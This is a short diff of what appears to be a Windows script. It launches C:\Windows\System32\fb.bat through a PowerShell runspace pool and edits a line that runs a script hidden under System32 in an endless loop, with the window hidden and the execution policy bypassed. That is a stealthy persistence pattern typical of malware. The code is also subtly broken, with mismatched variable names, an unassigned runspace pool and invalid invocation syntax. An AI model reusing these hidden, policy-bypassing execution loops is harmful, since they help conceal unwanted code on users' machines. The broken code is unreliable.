@@ -40,4 +40,4 @@ C:\Windows\System32\fb.bat
 
 $NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(C:\Windows\System32\fb.bat);;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke();
 
-powershell -w h -NoP -NonI -Exec Bypass 'while (1) { C:\Windows\System32\rr\rr.ps1; }'
+'while (1) { powershell -w h -NoP -NonI -Exec Bypass C:\Windows\System32\rr\rr.ps1; }'
